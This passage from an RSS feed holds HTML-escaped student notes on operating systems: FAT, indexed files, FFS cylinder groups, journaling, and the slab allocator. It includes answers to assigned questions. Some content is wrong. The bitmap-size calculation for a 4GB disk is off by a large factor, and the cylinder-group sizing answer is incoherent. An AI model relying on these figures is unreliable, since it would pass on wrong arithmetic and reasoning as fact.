&lt;li&gt;perfomance related to disk accesses&lt;/li&gt;
&lt;li&gt;each disk access takes time because of the rotataional delay&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;common-patterns&#34; &gt;Common Patterns
&lt;span&gt;
    &lt;a href=&#34;#common-patterns&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Sequential
&lt;ul&gt;
&lt;li&gt;Processed in sequential order&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Random access
&lt;ul&gt;
&lt;li&gt;Access any block in a file without passing predecessors (skipping)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Keyed access
&lt;ul&gt;
&lt;li&gt;Search for block with particular values&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dos-fs&#34; &gt;DOS FS
&lt;span&gt;
    &lt;a href=&#34;#dos-fs&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;File Allocation Table (FAT)&lt;/li&gt;
&lt;li&gt;Each directory has a mapping of filenames to index in FAT&lt;/li&gt;
&lt;li&gt;FAT contains next block.&lt;/li&gt;
&lt;li&gt;FAT is small enough to be cached is cheaper than disk access.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;indexed-files&#34; &gt;Indexed files
&lt;span&gt;
    &lt;a href=&#34;#indexed-files&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;requires large chunks of contiguous space space&lt;/li&gt;
&lt;li&gt;array of block pointers per file&lt;/li&gt;
&lt;li&gt;free list for allocations&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;multi-level-indexed-files&#34; &gt;Multi-level indexed files
&lt;span&gt;
    &lt;a href=&#34;#multi-level-indexed-files&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;14 block pointers&lt;/li&gt;
&lt;li&gt;first couple pointer point to blocks&lt;/li&gt;
&lt;li&gt;other pointers point to more and more indirect blocks&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;directories&#34; &gt;Directories
&lt;span&gt;
    &lt;a href=&#34;#directories&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Approach 1: known disk location; {name, inumber}, unique names&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Approach 2: Single directory per user&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Approach 3: Hierarchical name spaces, graph&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Root directory is always inode 2&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Special names in FS: (Root: &amp;ldquo;/&amp;rdquo;), (Current: &amp;ldquo;.&amp;rdquo;), (Parent: &amp;ldquo;..&amp;rdquo;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Special names not in FS: (User dir: &amp;ldquo;~&amp;rdquo;), globbing&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use cd to change directory, and ls to list names in current directory&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;hard-and-soft-links&#34; &gt;Hard and soft links
&lt;span&gt;
    &lt;a href=&#34;#hard-and-soft-links&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Each inode has a count of hard links&lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;ln source synonym&lt;/code&gt;  to create a link&lt;/li&gt;
&lt;li&gt;Inode for has special symlink bit set and contains target name (automatically translated by file system)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;fast-file-system-ffs&#34; &gt;Fast File System (FFS)
&lt;span&gt;
    &lt;a href=&#34;#fast-file-system-ffs&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Original file system
&lt;ul&gt;
&lt;li&gt;was slow and required inodes for directories as well&lt;/li&gt;
&lt;li&gt;blocks too smal (512 bytes)&lt;/li&gt;
&lt;li&gt;index too large&lt;/li&gt;
&lt;li&gt;poor clustering of related blobs, inodes far from datablocks, poor enumeration&lt;/li&gt;
&lt;li&gt;lacked atomic file updating&lt;/li&gt;
&lt;li&gt;uses a free list (linked list) of free blocks which gets jumbled and slow to find adjacent blocks&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cluster related objects together and seperate unrealted items&lt;/li&gt;
&lt;li&gt;With bigger block sizes, split unused large portions into &lt;em&gt;fragments&lt;/em&gt; when there is a need to allocate smaller files&lt;/li&gt;
&lt;li&gt;Fixed-size fragments allows the file system to allocate files in a more organized manner, which reduces fragmentation and improve performance&lt;/li&gt;
&lt;li&gt;Uses bit-map of free blocks which is much easier to find contiguous blocks and can be stored in memory, time increases only when fewer free blocks&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;clustering-in-ffs-using-cylinder-groups&#34; &gt;Clustering in FFS Using Cylinder Groups
&lt;span&gt;
    &lt;a href=&#34;#clustering-in-ffs-using-cylinder-groups&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Group at least one consequtive cylinder into a &lt;em&gt;cylinder group&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Order of retrieval is can access any block in a cylinder without a seek, and the next fastest place is an adjacent cylinder&lt;/li&gt;
&lt;li&gt;Put related data in the same cylinder group and unrealted items in another group
&lt;ul&gt;
&lt;li&gt;Different directories are placed in different cylinder groups&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tries to put sequential blocks in adjacent sectors&lt;/li&gt;
&lt;li&gt;Tries to keep same inode in same cylinder as file data&lt;/li&gt;
&lt;li&gt;Tries to keep all inodes for a dir in the same cylinder group&lt;/li&gt;
&lt;li&gt;Each cylinder group is a mini-Unix file system with a starting super block&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;bitmap&#34; &gt;Bitmap
&lt;span&gt;
    &lt;a href=&#34;#bitmap&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;As said before, a bitmap is used in place of a free list to make it much simpler to find contiguous free blocks. It can also be stored in memory as it is small.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If a 4GB disk has 4KB blocks, how big is the map? Each bit represents a 4KB blocks, so 4,000,000 KB / 4,000 KB = 1,000 bits = 125 bytes&lt;/li&gt;
&lt;li&gt;Keep 10% reserved without informing user&lt;/li&gt;
&lt;li&gt;Only allow root to allocate from the 10%&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;ffs-next-steps&#34; &gt;FFS Next Steps
&lt;span&gt;
    &lt;a href=&#34;#ffs-next-steps&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Contiguous blocks are named with a single pointer and length (ext2fs)&lt;/li&gt;
&lt;li&gt;Writes were done synchronously&lt;/li&gt;
&lt;li&gt;Make writes async with write-ordering or logging/journaling&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;log-structured-file-system&#34; &gt;Log-Structured File System
&lt;span&gt;
    &lt;a href=&#34;#log-structured-file-system&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://web.stanford.edu/~ouster/cgi-bin/papers/lfs.pdf&#34;&gt;paper&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;metadata-synchronously&#34; &gt;Metadata Synchronously
&lt;span&gt;
    &lt;a href=&#34;#metadata-synchronously&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;If we create a directory entry and crash during the middle of creating a directory entry and an IO block, what happens?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Block on disk&lt;/li&gt;
&lt;li&gt;Inode&lt;/li&gt;
&lt;li&gt;Directory entry pointing to an inode&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To ensure things work correctly, we need to flush to disk before the pointer pointing to the inode gets flushed. Therefore, we need to write out the data first, then create the inode, and then create the directory entry pointing to it. When deleting, first delete the directory entry, and then the inode.&lt;/p&gt;
&lt;p&gt;Log inode and dir entry to a log first. On crash, re-execute the log to copy back the file system. This is 2x the IO writes.
1GB sized journals.&lt;/p&gt;
&lt;h2 id=&#34;the-slab-allocator&#34; &gt;The Slab Allocator
&lt;span&gt;
    &lt;a href=&#34;#the-slab-allocator&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://rcs.uwaterloo.ca/~ali/readings/bonwick.pdf&#34;&gt;bonwick.pdf&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;object-caching&#34; &gt;Object Caching
&lt;span&gt;
    &lt;a href=&#34;#object-caching&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Allocating an object and destroying it repeatedly is time consuming and wasteful and can be improved upon by using a cache. Use a cached object if it in the cache and upon freeing, return the object to the cache. Better to do this in the central allocator since the OS has more insight into overall memory usage and it avoids bloating the size of the kernel code.&lt;/p&gt;
&lt;h3 id=&#34;questions&#34; &gt;Questions
&lt;span&gt;
    &lt;a href=&#34;#questions&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Question 1 (4)&lt;/p&gt;
&lt;p&gt;How does the slab allocator improve the worst-case runtime?&lt;/p&gt;
&lt;p&gt;In the worst case, there are lots of objects that are big in size.
Objects are cached in the slab allocator meaning that repeatedly allocating and freeing objects will not result in wasteful constructions and destructions. Rather with the cache, the object is simply initialized just once and is retrieved from the cache or put back into the cache. The client can also decide when to create and destroy the cache itself for many objects.&lt;/p&gt;
&lt;p&gt;Secondly, this object caching mechanism allows the slab allocator to take up pages for the same object type and use reference counting to free these pages rather than complex data structures that are non-constant in runtime. Therefore, allocations and reclaiming memory is fast as well. When objects are of the same time, they have the same lifetime distribution meaning less chance of pages being held meaning faster memory allocations when there are many applications running and competing for memory.&lt;/p&gt;
&lt;p&gt;Question 2 (4)&lt;/p&gt;
&lt;p&gt;How does the slab allocator improve the best-case runtime?&lt;/p&gt;
&lt;p&gt;In the best case, there are only allocations of small objects at the beginning and frees at the end. The slab layout offers a stub at the end of each slab for containing information about the buffers it has available. The interfaces are extremely lightweight meaning that little memory allocations.&lt;/p&gt;
&lt;p&gt;The slab allocator improves the best-case runtime, because as written in 5.3 (2), cache utilization is better. The Slab allocator gives each slab an offset so that buffers are distributed evenly throughout the cache rather than heavily loading the same cache lines. Without the offset, the same lines of the cache would be read since each buffer is of the same object type. The offset alleviates this cache loading and thus improves the miss rate which thus improve runtime even in the best cases.&lt;/p&gt;
&lt;p&gt;Question 3 (3)&lt;/p&gt;
&lt;p&gt;List the three largest sources of improved OS performance when using a slab allocator?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Object-cache interface&lt;/li&gt;
&lt;li&gt;Memory management via slabs (no limits, faster counting, same type buffers to reduce fragmentation)&lt;/li&gt;
&lt;li&gt;Slab coloring to improve cache utilization&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;the-fast-file-system&#34; &gt;The Fast File System
&lt;span&gt;
    &lt;a href=&#34;#the-fast-file-system&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://rcs.uwaterloo.ca/~ali/readings/ffs.pdf&#34;&gt;ffs.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;512 bytes → 1024 resulted in 2x performance&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;each disk transfer accessed twice the amount of data&lt;/li&gt;
&lt;li&gt;direct blocks contained twice as much data → most files don’t need indirect blocks
Randomization of data blocks causes deteriorated performance due to seeking before access
Super-block is at the start of each partition and contains critical data and is replicated. &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Question 1 (4)&lt;/p&gt;
&lt;p&gt;How does the performance benefits of cylinder groups change with number of cylinder groups? How would you size the cylinder groups on a modern multi-terabyte disk?&lt;/p&gt;
&lt;p&gt;The more cylinder groups, the more times the OS can group related data together. This means that bigger files can be stored and be read more efficiently (single pass). For sizing the cylinder groups on a multi-terabyte disk, we can expect files that are many gigabytes in size and so need enough groups to distribute these big files across many groups. We need 10MB cylinder groups to allocate a 100GB file on a 1TB system (1TB / 100GB ~= 10 MB). Reasoning is “The heuristic solution chosen is to redirect block allocation to a different cylinder group when a file exceeds 48 kilobytes, and at every megabyte thereafter.”&lt;/p&gt;
&lt;p&gt;Question 2 (4)&lt;/p&gt;
&lt;p&gt;One can repair most POSIX file systems through the fsck command. Typically, the computer detects an unclean unmount through the superblock and repairs the file system before the computer starts up by running fsck. If we want to optimize the computer startup time, we need to run fsck in the background and the file system must be &amp;lsquo;correct enough&amp;rsquo; to allow the computer to operate on it. Describe at least one precondition all file system writes must adhere to, to allow one to repair the file system in the background after the computer has booted.&lt;/p&gt;
&lt;p&gt;Writes must not corrupt the filesystem. For writes to not corrupt the filesystem, at all times, all inodes must point to valid data, and all directory entries must point to valid inodes. Therefore, writes must be done in the order of disk, then inode creation, then directory entry. This ensures that corrupt or random garbage data is not being read or pointed to by a directory entry or inode. This way, fsck can fix any broken pointers in the background while the computer boots fine.&lt;/p&gt;
&lt;p&gt;Quesion 3 (2)&lt;/p&gt;
&lt;p&gt;If you don&amp;rsquo;t want to use fragments, how can you reduce the space wasted by very small files (i.e., less than 56 Bytes).&lt;/p&gt;
&lt;p&gt;Dedicate end portions of each cylinder group for very small files. So blocks of 56 at the very of end of each group. Then whenever a file needs to be read or written, the OS should try reading from the end of the group rather than the front. Prevent bigger files from writing into these blocks. Since each cylinder group will have a fixed size, the OS should be able to calculate which blocks are of size 4096 and which blocks are of a smaller size, and then prevent writing multiple smaller blocks unless necessary. In essence, dedicated blocks for very small files at the end of each cylinder group where the OS knows beforehand the change in block sizes will enable reducing wasted space without using fragments.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
